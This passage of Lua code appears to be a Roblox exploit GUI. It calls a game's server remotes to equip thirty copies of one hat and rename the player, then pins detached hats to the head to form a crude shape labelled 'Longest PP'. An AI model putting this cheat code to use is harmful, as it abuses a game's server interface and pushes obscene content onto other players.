		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(at32.Orientation.X + XvalO.Value, at32.Orientation.Y + YvalO.Value, at32.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 10
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100

local function headFloat()
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://121572214"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
track:Play(.1, 1, 1)
end

local function swordHandle()
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://182393478"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
track:Play(.1, 1, 1)
end

local function swordSet()
    sword()
    swordHandle()
end
rightLeg()
leftLeg()
rightLeg2()
leftLeg2()
rightArm()
leftArm()
neck()
headFloat()
game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("tall man", "tall man")
end)

-- functions
-- close

Script_2.Name = "Script"
Script_2.Parent = HatScripts
Script_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_2.Position = UDim2.new(2.63461542, 0, 15, 0)
Script_2.Size = UDim2.new(0, 52, 0, 19)
Script_2.Visible = false
Script_2.TextScaled = true
Script_2.Font = Enum.Font.SourceSans
Script_2.Text = "Longest PP"
Script_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_2.TextSize = 14.000
Script_2.MouseButton1Click:connect(function()
   local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "63690008"
local args = {
    Face = "";
    
    Hat1 = code;
    Hat2 = code;
    Hat3 = code;
    Hat4 = code;
    Hat5 = code;
    Hat6 = code;
    Hat7 = code;
    Hat8 = code;
    Hat9 = code;
    Hat10 = code;
    Hat11 = code;
    Hat12 = code;
    Hat13 = code;
    Hat14 = code;
    Hat15 = code;
    Hat16 = code;
    Hat17 = code;
    Hat18 = code;
    Hat19 = code;
    Hat20 = code;
    Hat21 = code;
    Hat22 = code;
    Hat23 = code;
    Hat24 = code;
    Hat25 = code;
    Hat26 = code;
    Hat27 = code;
    Hat28 = code;
    Hat29 = code;
    Hat30 = code;

    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}



-- Main Animation
-- Hat Position
local function hat1()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "1"
local HAT = "1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function hat2()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "2"
print(fe.Name)
local HAT = "2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -2

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat3()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "3"
print(fe.Name)
local HAT = "3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -4

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat4()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "4"
print(fe.Name)
local HAT = "4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -6

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat5()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "5"
print(fe.Name)
local HAT = "5"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -8

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat6()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "6"
print(fe.Name)
local HAT = "6"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -8

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat6()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "6"
print(fe.Name)
local HAT = "6"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat7()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "7"
print(fe.Name)
local HAT = "7"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -12

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat8()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "8"
print(fe.Name)
local HAT = "8"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -14

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat9()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "9"
print(fe.Name)
local HAT = "9"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -16

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat10()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "10"
print(fe.Name)
local HAT = "10"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -18

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat11()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "11"
local HAT = "11"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -20

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function hat12()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "12"
print(fe.Name)
